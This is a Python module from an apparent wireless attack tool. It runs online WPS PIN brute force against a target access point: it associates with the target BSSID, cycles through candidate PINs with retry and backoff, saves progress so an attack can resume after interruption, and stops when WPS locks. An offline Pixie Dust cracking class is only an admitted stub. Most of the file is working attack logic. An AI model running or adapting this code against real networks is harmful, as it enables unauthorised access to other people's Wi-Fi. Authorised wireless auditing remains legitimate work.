"""
Brute force attack orchestration module.
Author: Farhan

Manages online/offline WPS PIN brute force attacks with throttling,
backoff, retry logic, and resume capability.
"""

import time
import json
from typing import List, Optional, Dict, Callable
from pathlib import Path
from dataclasses import dataclass, asdict

from .pingen import PINCandidate
from .wpa_ctrl import WPAController, WPAResponse
from .logger import Timer


@dataclass
class AttackProgress:
    """Track attack progress for resume capability."""
    
    bssid: str
    total_pins: int
    tried_pins: List[str]
    current_index: int
    start_time: float
    success: bool = False
    found_pin: Optional[str] = None


class BruteForceAttack:
    """Brute force attack orchestrator."""
    
    def __init__(self,
                 wpa_ctrl: WPAController,
                 delay: float = 1.0,
                 max_retries: int = 3,
                 backoff_multiplier: float = 1.5,
                 progress_file: Optional[str] = None) -> None:
        """
        Initialize brute force attack orchestrator.
        
        Args:
            wpa_ctrl: WPA controller instance
            delay: Delay between PIN attempts (seconds)
            max_retries: Maximum retries per PIN on transient errors
            backoff_multiplier: Backoff multiplier for retries
            progress_file: Optional file to save/load progress
        """
        self.wpa_ctrl = wpa_ctrl
        self.delay = delay
        self.max_retries = max_retries
        self.backoff_multiplier = backoff_multiplier
        self.progress_file = progress_file
        self.progress: Optional[AttackProgress] = None
    
    def save_progress(self) -> None:
        """Save current progress to file."""
        if not self.progress_file or not self.progress:
            return
        
        try:
            progress_path = Path(self.progress_file)
            progress_path.parent.mkdir(parents=True, exist_ok=True)
            
            with open(progress_path, 'w', encoding='utf-8') as f:
                json.dump(asdict(self.progress), f, indent=2)
        except IOError:
            pass  # Silent fail on progress save
    
    def load_progress(self, bssid: str) -> bool:
        """
        Load progress for a specific BSSID.
        
        Args:
            bssid: BSSID to load progress for
        
        Returns:
            True if progress loaded, False otherwise
        """
        if not self.progress_file:
            return False
        
        try:
            progress_path = Path(self.progress_file)
            if not progress_path.exists():
                return False
            
            with open(progress_path, 'r', encoding='utf-8') as f:
                data = json.load(f)
            
            if data.get('bssid') == bssid and not data.get('success'):
                self.progress = AttackProgress(**data)
                return True
        except (IOError, json.JSONDecodeError, TypeError):
            pass
        
        return False
    
    def try_pin(self, bssid: str, pin: str) -> WPAResponse:
        """
        Try a single PIN with retry logic.
        
        Args:
            bssid: Target BSSID
            pin: PIN to try
        
        Returns:
            WPAResponse from PIN attempt
        """
        response = None
        for attempt in range(self.max_retries):
            response = self.wpa_ctrl.send_wps_pin(bssid, pin)
            
            # Success or definitive failure (wrong PIN)
            if response.success or response.error_code == "WRONG_PIN":
                return response
            
            # Transient error - retry with backoff
            if attempt < self.max_retries - 1:
                backoff = self.delay * (self.backoff_multiplier ** attempt)
                time.sleep(backoff)
        
        # Max retries reached, return last response (guaranteed to exist after loop)
        assert response is not None
        return response
    
    def run_attack(self,
                   bssid: str,
                   ssid: str,
                   pin_candidates: List[PINCandidate],
                   progress_callback: Optional[Callable[[int, int, str], None]] = None,
                   stop_on_locked: bool = True) -> Optional[str]:
        """
        Execute brute force attack.
        
        Args:
            bssid: Target BSSID
            ssid: Target SSID
            pin_candidates: List of PIN candidates to try
            progress_callback: Optional callback(current, total, pin)
            stop_on_locked: Stop if WPS becomes locked
        
        Returns:
            Found PIN string or None if not found
        """
        # Try to load previous progress
        resume = self.load_progress(bssid)
        
        if resume and self.progress:
            start_index = self.progress.current_index
            tried_pins = set(self.progress.tried_pins)
        else:
            start_index = 0
            tried_pins = set()
            self.progress = AttackProgress(
                bssid=bssid,
                total_pins=len(pin_candidates),
                tried_pins=[],
                current_index=0,
                start_time=time.time()
            )
        
        # Ensure association
        assoc_response = self.wpa_ctrl.associate_ap(bssid, ssid)
        if not assoc_response.success:
            return None
        
        # Try each PIN
        for i, candidate in enumerate(pin_candidates[start_index:], start=start_index):
            pin = candidate.pin
            
            # Skip already tried PINs
            if pin in tried_pins:
                continue
            
            # Call progress callback
            if progress_callback:
                progress_callback(i + 1, len(pin_candidates), pin)
            
            # Try PIN
            response = self.try_pin(bssid, pin)
            
            # Update progress
            self.progress.tried_pins.append(pin)
            self.progress.current_index = i + 1
            tried_pins.add(pin)
            
            # Check result
            if response.success:
                self.progress.success = True
                self.progress.found_pin = pin
                self.save_progress()
                return pin
            
            # Check for WPS lock (backward compatible message)
            if stop_on_locked and 'locked' in response.message.lower():
                self.save_progress()
                return None
            
            # Save progress periodically
            if i % 10 == 0:
                self.save_progress()
            
            # Delay before next attempt
            time.sleep(self.delay)
        
        # Attack completed without success
        self.save_progress()
        return None
    
    def estimate_time_remaining(self, current: int, total: int, 
                               elapsed: float) -> str:
        """
        Estimate remaining time for attack.
        
        Args:
            current: Current PIN index
            total: Total number of PINs
            elapsed: Elapsed time in seconds
        
        Returns:
            Formatted time estimate string
        """
        if current == 0:
            return "Unknown"
        
        avg_time_per_pin = elapsed / current
        remaining_pins = total - current
        remaining_seconds = int(avg_time_per_pin * remaining_pins)
        
        hours = remaining_seconds // 3600
        minutes = (remaining_seconds % 3600) // 60
        seconds = remaining_seconds % 60
        
        if hours > 0:
            return f"{hours}h {minutes}m {seconds}s"
        elif minutes > 0:
            return f"{minutes}m {seconds}s"
        else:
            return f"{seconds}s"


class OfflineBruteForce:
    """Offline brute force using captured Pixie Dust data."""
    
    @staticmethod
    def crack_from_pixie_data(pin_candidates: List[PINCandidate],
                              e_hash1: str,
                              e_hash2: str,
                              pke: str,
                              pkr: str) -> Optional[str]:
        """
        Attempt offline PIN cracking from Pixie Dust data.
        
        Args:
            pin_candidates: List of PIN candidates to try
            e_hash1: E-Hash1 value
            e_hash2: E-Hash2 value
            pke: Public Key Enrollee
            pkr: Public Key Registrar
        
        Returns:
            Found PIN or None
        
        Note:
            This is a placeholder for offline attack implementation.
            Real implementation would involve cryptographic validation
            of PIN candidates against captured hashes.
        """
        # This would require implementing the WPS protocol's
        # hash verification logic to validate PINs offline
        # For now, this is a stub for future implementation
        return None
